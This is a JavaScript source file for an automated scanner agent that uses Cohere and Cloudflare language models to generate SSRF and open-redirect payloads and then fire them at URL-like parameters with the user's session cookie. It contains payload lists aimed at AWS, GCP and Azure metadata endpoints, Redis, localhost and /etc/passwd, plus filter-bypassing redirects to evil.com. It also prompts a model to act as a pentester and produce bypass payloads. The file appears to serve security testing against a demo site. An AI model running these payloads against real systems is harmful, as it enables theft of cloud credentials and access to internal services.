/**
 * SSRF & Open Redirect Agent — Powered by Cohere Command-R
 * 
 * Cohere is now used here instead of for header analysis (which is rule-based).
 * This agent targets URL-like parameters that are prime candidates for:
 *  - Server-Side Request Forgery (SSRF) → access internal services, cloud metadata
 *  - Open Redirect → phishing, OAuth token theft
 * 
 * testfire.net has a known Open Redirect: /disclaimer.htm?url=<any-url>
 */
const RagMemory = require('./ragMemory');
const fs = require('fs');
const path = require('path');
const askCloudflare = require('./utils/cloudflareFallback');
require('dotenv').config();

// Parameters that commonly lead to SSRF / Open Redirect
const URL_PARAM_PATTERNS = /^(url|uri|path|link|redirect|return|next|dest|destination|target|goto|ref|referrer|to|from|src|source|site|domain|endpoint|callback|continue|forward|out|image|img|file|resource|load|fetch|request|proxy|navigate|location|page|host|origin|service|api)$/i;

// SSRF internal target payloads
const SSRF_TARGETS = [
  'http://127.0.0.1/',
  'http://localhost/',
  'http://169.254.169.254/latest/meta-data/',     // AWS metadata
  'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
  'http://169.254.169.254/metadata/instance',      // Azure metadata
  'http://0.0.0.0/',
  'http://[::1]/',
  'http://127.0.0.1:8080/',
  'http://127.0.0.1:22/',
  'dict://127.0.0.1:6379/',                         // Redis
  'file:///etc/passwd'
];

// Open redirect payload patterns
const REDIRECT_PAYLOADS = [
  'https://evil.com',
  '//evil.com',
  '///evil.com',
  'https://evil.com%2F@legitimate.com',
  'javascript:alert(document.domain)',
  '\\\\evil.com',
  '/\\evil.com',
  'https:evil.com',
  '%0d%0ahttps://evil.com',
  'https://legitimate.com.evil.com'
];

class SSRFAgent {
  constructor() {
    this.name = 'SSRF & Open Redirect Agent (Cohere Command-R)';
    this.type = 'SSRF';
    this.apiKey = process.env.COHERE_API_KEY;
    this.logLines = [];
  }

  log(msg) {
    const line = `  [SSRF Agent] ${msg}`;
    console.log(line);
    this.logLines.push(`${new Date().toISOString()} ${line}`);
  }

  async analyze(attackVectors, io = null, scanId = null, sessionCookie = '') {
    this.log(`Starting SSRF/Open Redirect analysis...`);
    if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'started', vectors: attackVectors.length });

    // Only test parameters that look like URL/redirect parameters
    const urlVectors = attackVectors.filter(v => URL_PARAM_PATTERNS.test(v.parameter?.name || ''));
    this.log(`Found ${urlVectors.length} URL-like parameters out of ${attackVectors.length} total vectors`);

    if (urlVectors.length === 0) {
      this.log(`No URL-like parameters found. Skipping SSRF/Open Redirect tests.`);
      if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'completed', findings: 0 });
      return [];
    }

    const targets = urlVectors.slice(0, 10);
    const findings = [];

    // Ask Cohere to generate smart, context-aware payloads
    const coherePayloads = await this.generatePayloads(targets);

    // Fire all tests in parallel
    const testPromises = targets.map(vector => {
      if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'probing', parameter: vector.parameter?.name, endpoint: vector.endpoint?.url });
      return this.testVector(vector, coherePayloads, sessionCookie);
    });
    const results = await Promise.allSettled(testPromises);

    for (const r of results) {
      if (r.status === 'fulfilled' && r.value) findings.push(r.value);
    }

    this.log(`Analysis complete. Found ${findings.length} SSRF/Open Redirect vulnerabilities.`);
    if (io) io.emit('agent:update', { scanId, agent: this.type, status: 'completed', findings: findings.length });
    this.saveLog();
    return findings;
  }

  async generatePayloads(vectors) {
    const paramNames = vectors.map(v => v.parameter?.name).join(', ');
    const sampleUrls = vectors.slice(0, 3).map(v => v.endpoint?.url).join('\n');

    const prompt = `You are an expert web security pentester specializing in SSRF and Open Redirect vulnerabilities.

Target endpoints (sample):
${sampleUrls}

URL-like parameters found: ${paramNames}

Generate a JSON object with two arrays:
1. "ssrf_payloads": 5 SSRF payloads targeting internal services (AWS metadata, localhost, internal IPs)
2. "redirect_payloads": 5 Open Redirect payloads that would bypass common filters

Return ONLY valid JSON, no explanation:
{
  "ssrf_payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", ...],
  "redirect_payloads": ["https://evil.com", "//evil.com", ...]
}`;

    try {
      const res = await fetch('https://api.cohere.com/v1/chat', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'command-r-08-2024',
          message: prompt,
          max_tokens: 300,
          temperature: 0.3
        })
      });
      if (res.status === 429) throw new Error('429 Rate Limit');
      const data = await res.json();
      const text = data.text || '{}';
      const jsonMatch = text.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const parsed = JSON.parse(jsonMatch[0]);
        this.log(`Cohere generated ${parsed.ssrf_payloads?.length || 0} SSRF + ${parsed.redirect_payloads?.length || 0} redirect payloads`);
        return {
          ssrf: (parsed.ssrf_payloads || []).concat(SSRF_TARGETS).slice(0, 8),
          redirect: (parsed.redirect_payloads || []).concat(REDIRECT_PAYLOADS).slice(0, 8)
        };
      }
    } catch (e) {
      this.log(`  ⚠ Cohere payload generation failed (${e.message}), falling back to Cloudflare AI`);
      try {
        const text = await askCloudflare(prompt);
        const jsonMatch = text.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const parsed = JSON.parse(jsonMatch[0]);
          return {
            ssrf: (parsed.ssrf_payloads || []).concat(SSRF_TARGETS).slice(0, 8),
            redirect: (parsed.redirect_payloads || []).concat(REDIRECT_PAYLOADS).slice(0, 8)
          };
        }
      } catch (cfErr) {
        this.log(`  ⚠ Cloudflare fallback also failed: ${cfErr.message}`);
      }
    }

    return { ssrf: SSRF_TARGETS.slice(0, 6), redirect: REDIRECT_PAYLOADS.slice(0, 6) };
  }

  async testVector(vector, payloads, sessionCookie = '') {
    const { endpoint, parameter } = vector;
    if (!endpoint?.url || !parameter?.name) return null;

    this.log(`Testing ${endpoint.url} [param: ${parameter.name}]`);

    // Test Open Redirect first (faster, no SSRF detection needed)
    const redirectResult = await this.testOpenRedirect(endpoint, parameter.name, payloads.redirect, sessionCookie);
    if (redirectResult) return redirectResult;

    // Test SSRF
    const ssrfResult = await this.testSSRF(endpoint, parameter.name, payloads.ssrf, sessionCookie);
    if (ssrfResult) return ssrfResult;

    return null;
  }

  async testOpenRedirect(endpoint, paramName, payloads, sessionCookie = '') {
    for (const payload of payloads) {
      try {
        const testUrl = this.buildUrl(endpoint.url, paramName, payload);
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 8000);

        const headers1 = { 'User-Agent': 'Mozilla/5.0' };
        if (sessionCookie) headers1['Cookie'] = sessionCookie;

        // Check server-side redirect (3xx)
        const resManual = await fetch(testUrl, {
          signal: controller.signal,
          redirect: 'manual',
          headers: headers1
        });

        const location = resManual.headers.get('location') || '';
        const isServerRedirect = (resManual.status >= 300 && resManual.status < 400) &&
          (location.includes('evil.com') || location.startsWith('//') || location.toLowerCase().includes('javascript:'));

        if (isServerRedirect) {
          this.log(`  ✅ SERVER-SIDE OPEN REDIRECT! ${paramName}=${payload} → Location: ${location}`);
          return {
            finding: true, type: 'Open Redirect', endpoint: endpoint.url, parameter: paramName,
            payload, severity: 'Medium', cvss: 6.1,
            description: `Server-side Open Redirect confirmed. HTTP ${resManual.status} Location: ${location}. Attackers can use this for phishing and OAuth token theft.`,
            proof: `HTTP ${resManual.status} → Location: ${location}`,
            remediation: 'Whitelist allowed redirect destinations. Never redirect to user-supplied URLs.', testUrl
          };
        }

        // Check client-side redirect (JavaScript window.location, meta refresh, links in HTML)
        const controller2 = new AbortController();
        setTimeout(() => controller2.abort(), 8000);
        
        const headers2 = { 'User-Agent': 'Mozilla/5.0' };
        if (sessionCookie) headers2['Cookie'] = sessionCookie;

        const resFollow = await fetch(testUrl, { signal: controller2.signal, redirect: 'follow', headers: headers2 });
        const body = await resFollow.text();

        const payloadDomain = payload.replace(/^https?:\/\//, '').replace(/^\/\//, '').split('/')[0]; // e.g. "evil.com"
        // Guard: if payloadDomain is empty, skip (avoids false positive since ''.includes('') === true)
        if (!payloadDomain || payloadDomain.length < 3) continue;
        const isClientRedirect =
          body.includes(payloadDomain) && (
            /window\.location/i.test(body) ||
            /meta[^>]+refresh/i.test(body) ||
            /href\s*=\s*["'][^"']*evil\.com/i.test(body) ||
            body.toLowerCase().includes('you are leaving') ||
            body.toLowerCase().includes('you are about to leave') ||
            body.toLowerCase().includes('external link') ||
            body.toLowerCase().includes('continue to')
          );

        if (isClientRedirect) {
          this.log(`  ✅ CLIENT-SIDE OPEN REDIRECT! Payload domain "${payloadDomain}" embedded in response`);
          return {
            finding: true, type: 'Open Redirect', endpoint: endpoint.url, parameter: paramName,
            payload, severity: 'Medium', cvss: 6.1,
            description: `Client-side Open Redirect confirmed. The page reflects the user-supplied URL "${payload}" in an outbound link or JavaScript redirect. Attackers can craft phishing URLs on a trusted domain.`,
            proof: `Response body contains "${payloadDomain}" in a redirect/link context.`,
            remediation: 'Validate and whitelist redirect destinations server-side before rendering them in HTML.', testUrl
          };
        }
      } catch (e) { /* timeout or connection error */ }
    }
    return null;
  }


  async testSSRF(endpoint, paramName, payloads, sessionCookie = '') {
    for (const payload of payloads) {
      try {
        const testUrl = this.buildUrl(endpoint.url, paramName, payload);
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 8000);

        const headers = { 'User-Agent': 'Mozilla/5.0' };
        if (sessionCookie) headers['Cookie'] = sessionCookie;

        const res = await fetch(testUrl, {
          signal: controller.signal,
          redirect: 'follow',
          headers: headers
        });

        const body = await res.text();

        // SSRF indicators in response body
        const ssrfIndicators = [
          /ami-id/i,              // AWS metadata
          /instance-id/i,         // Cloud metadata
          /169\.254\.169\.254/,   // Metadata IP in response
          /root:x:0:0/,           // /etc/passwd
          /computeMetadata/i,     // GCP
          /identityToken/i,       // Azure
          /\{"code":\s*"Success"/, // Azure metadata success
          /"AccessKeyId"/,        // AWS credentials
        ];

        const foundIndicator = ssrfIndicators.find(sig => sig.test(body));
        if (foundIndicator) {
          this.log(`  ✅ SSRF CONFIRMED! Payload: ${payload} → Found indicator in response`);
          return {
            finding: true,
            type: 'SSRF',
            endpoint: endpoint.url,
            parameter: paramName,
            payload,
            severity: 'Critical',
            cvss: 9.3,
            description: `Server-Side Request Forgery (SSRF) confirmed. The server fetched ${payload} and returned internal data. An attacker can use this to access cloud metadata (AWS/GCP/Azure credentials), scan internal network, or read local files.`,
            proof: body.substring(0, 300),
            remediation: 'Block requests to private IP ranges (RFC 1918). Whitelist allowed external domains. Disable unnecessary URL schemes.',
            testUrl
          };
        }
      } catch (e) { /* expected for most SSRF targets */ }
    }
    return null;
  }

  buildUrl(url, paramName, payload) {
    try {
      const u = new URL(url);
      u.searchParams.set(paramName, payload);
      return u.toString();
    } catch {
      return `${url}?${paramName}=${encodeURIComponent(payload)}`;
    }
  }

  saveLog() {
    try {
      const logDir = path.join(__dirname, '..', '..', 'logs');
      if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, { recursive: true });
      fs.writeFileSync(path.join(logDir, `ssrf-agent-${Date.now()}.log`), this.logLines.join('\n'));
    } catch (e) {}
  }
}

module.exports = new SSRFAgent();
